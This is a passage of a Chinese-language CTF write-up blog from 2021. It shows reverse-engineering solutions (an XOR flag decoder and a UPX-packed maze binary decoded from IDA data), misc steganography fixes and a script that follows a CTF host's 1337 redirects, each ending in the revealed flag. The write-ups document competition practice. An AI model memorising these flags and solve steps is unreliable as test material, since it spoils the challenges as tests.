key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x5</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x5</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span>
       <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x7</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s2 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ss<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'DASCTF&#123;'</span> <span class="token operator">+</span> s2 <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span>

<span class="token comment"># DASCTF&#123;cfdc11cca823cb81c9456b67b5dd4c8d&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="end"><a href="#end" class="headerlink" title="end"></a>end</h3><p>emmm，因为我 前几天重装了系统，电脑里面没有PE检查工具，开始直接拖入ida32里面去了，但是其实加了一个UPX的壳，要先用工具脱壳再拖入ida32中。</p>
<p>拖入ida之后肯定是要先看看start函数了，但是没啥发现，直接shift+f12搜索字符串发现flag的痕迹，一路追过去发现关键代码</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_40238F</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-47Ch] BYREF</span>
  <span class="token keyword">char</span> Buffer<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+71h] [ebp-423h] BYREF</span>
  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+84h] [ebp-410h] BYREF</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+94h] [ebp-400h] BYREF</span>
  <span class="token keyword">int</span> v8<span class="token punctuation">[</span><span class="token number">250</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+98h] [ebp-3FCh] BYREF</span>
  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+480h] [ebp-14h]</span>
  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+484h] [ebp-10h]</span>
  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [esp+488h] [ebp-Ch]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+48Ch] [ebp-8h]</span>

  <span class="token function">sub_402B50</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">do</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v0 <span class="token operator">=</span> i<span class="token operator">++</span><span class="token punctuation">;</span>
      v8<span class="token punctuation">[</span>v0<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>
      <span class="token keyword">switch</span> <span class="token punctuation">(</span> v7 <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
          v11 <span class="token operator">+=</span> <span class="token number">7</span><span class="token punctuation">;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>
          v11 <span class="token operator">-=</span> <span class="token number">7</span><span class="token punctuation">;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>
          <span class="token operator">++</span>v11<span class="token punctuation">;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>
          <span class="token operator">--</span>v11<span class="token punctuation">;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token operator">:</span>
          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_406060<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token punctuation">)</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_406060<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"continue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> dword_406060<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">35</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> v8<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v1 <span class="token operator">=</span> v9<span class="token operator">++</span><span class="token punctuation">;</span>
    v10 <span class="token operator">+=</span> v8<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">sprintf</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">,</span> <span class="token string">"%d"</span><span class="token punctuation">,</span> v10<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_401410</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_401451</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">,</span> Buffer<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_401582</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"congratulation"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the flag is &#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>根据题目提示”走啊走啊”可以猜测这是一道迷宫题。迷宫的地图为</p>
<pre class="line-numbers language-data" data-language="data"><code class="language-data">.data:00406064                 db    0
.data:00406065                 db    0
.data:00406066                 db    0
.data:00406067                 db    0
.data:00406068                 db    0
.data:00406069                 db    0
.data:0040606A                 db    0
.data:0040606B                 db    0
.data:0040606C                 db    0
.data:0040606D                 db    0
.data:0040606E                 db    0
.data:0040606F                 db    0
.data:00406070                 db    0
.data:00406071                 db    0
.data:00406072                 db    0
.data:00406073                 db    0
.data:00406074                 db    0
.data:00406075                 db    0
.data:00406076                 db    0
.data:00406077                 db    0
.data:00406078                 db    0
.data:00406079                 db    0
.data:0040607A                 db    0
.data:0040607B                 db    0
.data:0040607C                 db    1
.data:0040607D                 db    0
.data:0040607E                 db    0
.data:0040607F                 db    0
.data:00406080                 db    1
.data:00406081                 db    0
.data:00406082                 db    0
.data:00406083                 db    0
.data:00406084                 db    0
.data:00406085                 db    0
.data:00406086                 db    0
.data:00406087                 db    0
.data:00406088                 db    0
.data:00406089                 db    0
.data:0040608A                 db    0
.data:0040608B                 db    0
.data:0040608C                 db    0
.data:0040608D                 db    0
.data:0040608E                 db    0
.data:0040608F                 db    0
.data:00406090                 db    0
.data:00406091                 db    0
.data:00406092                 db    0
.data:00406093                 db    0
.data:00406094                 db    0
.data:00406095                 db    0
.data:00406096                 db    0
.data:00406097                 db    0
.data:00406098                 db    0
.data:00406099                 db    0
.data:0040609A                 db    0
.data:0040609B                 db    0
.data:0040609C                 db    1
.data:0040609D                 db    0
.data:0040609E                 db    0
.data:0040609F                 db    0
.data:004060A0                 db    0
.data:004060A1                 db    0
.data:004060A2                 db    0
.data:004060A3                 db    0
.data:004060A4                 db    1
.data:004060A5                 db    0
.data:004060A6                 db    0
.data:004060A7                 db    0
.data:004060A8                 db    1
.data:004060A9                 db    0
.data:004060AA                 db    0
.data:004060AB                 db    0
.data:004060AC                 db    1
.data:004060AD                 db    0
.data:004060AE                 db    0
.data:004060AF                 db    0
.data:004060B0                 db    0
.data:004060B1                 db    0
.data:004060B2                 db    0
.data:004060B3                 db    0
.data:004060B4                 db    0
.data:004060B5                 db    0
.data:004060B6                 db    0
.data:004060B7                 db    0
.data:004060B8                 db    1
.data:004060B9                 db    0
.data:004060BA                 db    0
.data:004060BB                 db    0
.data:004060BC                 db    1
.data:004060BD                 db    0
.data:004060BE                 db    0
.data:004060BF                 db    0
.data:004060C0                 db    1
.data:004060C1                 db    0
.data:004060C2                 db    0
.data:004060C3                 db    0
.data:004060C4                 db    0
.data:004060C5                 db    0
.data:004060C6                 db    0
.data:004060C7                 db    0
.data:004060C8                 db    1
.data:004060C9                 db    0
.data:004060CA                 db    0
.data:004060CB                 db    0
.data:004060CC                 db    0
.data:004060CD                 db    0
.data:004060CE                 db    0
.data:004060CF                 db    0
.data:004060D0                 db    0
.data:004060D1                 db    0
.data:004060D2                 db    0
.data:004060D3                 db    0
.data:004060D4                 db    0
.data:004060D5                 db    0
.data:004060D6                 db    0
.data:004060D7                 db    0
.data:004060D8                 db    0
.data:004060D9                 db    0
.data:004060DA                 db    0
.data:004060DB                 db    0
.data:004060DC                 db    0
.data:004060DD                 db    0
.data:004060DE                 db    0
.data:004060DF                 db    0
.data:004060E0                 db    0
.data:004060E1                 db    0
.data:004060E2                 db    0
.data:004060E3                 db    0
.data:004060E4                 db    1
.data:004060E5                 db    0
.data:004060E6                 db    0
.data:004060E7                 db    0
.data:004060E8                 db    0
.data:004060E9                 db    0
.data:004060EA                 db    0
.data:004060EB                 db    0
.data:004060EC                 db    1
.data:004060ED                 db    0
.data:004060EE                 db    0
.data:004060EF                 db    0
.data:004060F0                 db    0
.data:004060F1                 db    0
.data:004060F2                 db    0
.data:004060F3                 db    0
.data:004060F4                 db    0
.data:004060F5                 db    0
.data:004060F6                 db    0
.data:004060F7                 db    0
.data:004060F8                 db    1
.data:004060F9                 db    0
.data:004060FA                 db    0
.data:004060FB                 db    0
.data:004060FC                 db    1
.data:004060FD                 db    0
.data:004060FE                 db    0
.data:004060FF                 db    0
.data:00406100                 db    1
.data:00406101                 db    0
.data:00406102                 db    0
.data:00406103                 db    0
.data:00406104                 db    0
.data:00406105                 db    0
.data:00406106                 db    0
.data:00406107                 db    0
.data:00406108                 db    1
.data:00406109                 db    0
.data:0040610A                 db    0
.data:0040610B                 db    0
.data:0040610C                 db    0
.data:0040610D                 db    0
.data:0040610E                 db    0
.data:0040610F                 db    0
.data:00406110                 db    0
.data:00406111                 db    0
.data:00406112                 db    0
.data:00406113                 db    0
.data:00406114                 db    1
.data:00406115                 db    0
.data:00406116                 db    0
.data:00406117                 db    0
.data:00406118                 db    0
.data:00406119                 db    0
.data:0040611A                 db    0
.data:0040611B                 db    0
.data:0040611C                 db    0
.data:0040611D                 db    0
.data:0040611E                 db    0
.data:0040611F                 db    0
.data:00406120                 db    0
.data:00406121                 db    0
.data:00406122                 db    0
.data:00406123                 db    0
.data:00406124                 db    0
.data:00406125                 db    0
.data:00406126                 db    0
.data:00406127                 db    0
.data:00406128                 db    0
.data:00406129                 db    0
.data:0040612A                 db    0
.data:0040612B                 db    0
.data:0040612C                 db    0
.data:0040612D                 db    0
.data:0040612E                 db    0
.data:0040612F                 db    0
.data:00406130                 db    1
.data:00406131                 db    0
.data:00406132                 db    0
.data:00406133                 db    0
.data:00406134                 db    1
.data:00406135                 db    0
.data:00406136                 db    0
.data:00406137                 db    0
.data:00406138                 db    1
.data:00406139                 db    0
.data:0040613A                 db    0
.data:0040613B                 db    0
.data:0040613C                 db    35<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>把上面的数据保存成<code>migong.txt</code>，然后用下面的脚本还原出迷宫</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'migong.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            res <span class="token operator">+=</span> <span class="token string">'\n'</span>
        res <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>

ress <span class="token operator">=</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>ress<span class="token punctuation">)</span>

res2 <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> ress<span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'1'</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>
        res2 <span class="token operator">+=</span> <span class="token string">'X'</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        res2 <span class="token operator">+=</span> <span class="token string">'O'</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>所以这道题中的迷宫就是下面的这样，至于为什么要把四个比特位似的东西合成一个比特位俺也不知道，回头等比赛结束看看带师傅的博客学习学习。</p>
<pre class="line-numbers language-migong" data-language="migong"><code class="language-migong">XOOOOOX
XOOOOOO
XOXXXOO
XXXOXOO
OOOOXOX
OOXXXOX
OOXOOOO
OOXXX

2622668662224422666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后把exe文件拖入OD中依次输入上面的数字最后弹出flag</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210529190326303.png" alt="动态调试"></p>
<p><code>DASCTF&#123;f033ab37c30201f73f142449d037028d&#125;</code></p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="RelatedMessage"><a href="#RelatedMessage" class="headerlink" title="RelatedMessage"></a>RelatedMessage</h3><p><strong>泻药，好像是椭圆曲线+rsa？不会没做。</strong></p>
<h1 id="baby杯-CTFshow六一儿童节特辑"><a href="#baby杯-CTFshow六一儿童节特辑" class="headerlink" title="baby杯(CTFshow六一儿童节特辑)"></a>baby杯(CTFshow六一儿童节特辑)</h1><h2 id="MISC-2"><a href="#MISC-2" class="headerlink" title="MISC"></a>MISC</h2><h3 id="五子棋"><a href="#五子棋" class="headerlink" title="五子棋"></a>五子棋</h3><p>本来都不知道怎么打的，群友们一提示说是开两个人机，让他们互打，最后总有一个会赢，打了三分钟左右成功获得flag</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210602204305469.png" alt="确实不难ao"></p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;Wu_J1n_5h0u_H31_X14n_B1_5h3ng@wld13qr0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="美丽的小姐姐"><a href="#美丽的小姐姐" class="headerlink" title="美丽的小姐姐"></a>美丽的小姐姐</h3><p>简单的高度隐写，直接修改高度即可获得flag</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210602211959461.png" alt="开始时是01B8，改成02B8即可把高度变高"></p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210602212100552.png" alt="image-20210602212100552"></p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;BF9FE48F92A9AB8948F5E266E7CE8EB4&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="babyLSB"><a href="#babyLSB" class="headerlink" title="babyLSB"></a>babyLSB</h3><h1 id="Xctf-7月赛"><a href="#Xctf-7月赛" class="headerlink" title="Xctf 7月赛"></a>Xctf 7月赛</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210725145150731.png" alt>说实话这个比赛太国际了，不是特别想打，因为我太菜了，练习时长还没两年半的ctf练习生，我只配复复现，打这种比赛估计还是要继续练习一两年才行。所以我大概看了看，这个比赛我自己打的话估计只能拿200分左右。</p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Ad-Network"><a href="#Ad-Network" class="headerlink" title="Ad Network"></a>Ad Network</h3><p>因为不断重定向了1337次才能获得flag，这时候写脚本比较方便而且不费时间，写个脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

originurl <span class="token operator">=</span> <span class="token string">"http://adnetwork-cybrics2021.ctf.su/adnetwork"</span>

resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>originurl<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
url <span class="token operator">=</span> resp<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">18</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[1] "</span><span class="token operator">+</span>url<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1336</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
    url <span class="token operator">=</span> resp<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">18</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&#123;0&#125;] "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>

<span class="token comment"># [1337] http://tend.adnetwork-cybrics2021.ctf.su/military-front-low/learn-fill-though-factor-line/hear-hundred-subject-wind/enough-lot-tree-will-color</span>
<span class="token comment"># cybrics&#123;f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="rebyc"><a href="#rebyc" class="headerlink" title="rebyc"></a>rebyc</h2><p>​    这是什么新的题型？看起来有点像是misc。</p>
<h3 id="CAPTCHA-The-Flag"><a href="#CAPTCHA-The-Flag" class="headerlink" title="CAPTCHA The Flag"></a>CAPTCHA The Flag</h3><p>​    给出的是个网站，让输入验证码，但是验证码是使用了lsb隐写的，所以这里需要先把图片下载下来，然后用stegsolve看，我比较菜没思路写脚本才使用了这种比较原始的方案。</p>
<p>​    最后得出的flag为</p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">cybrics&#123;a_k33n_Ey3_wi11_sp0T_r1GhT_aw4Y&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210725141418228.png" alt></p>
<h1 id="CCTF"><a href="#CCTF" class="headerlink" title="CCTF"></a>CCTF</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210731162302563.png" alt></p>
<p>多做点ctftime上的题，这上面的wp也好找，也算是跟进一下国外的ctf方面的动态。下面的题目是按平台上面给出的难度系数分的类。</p>
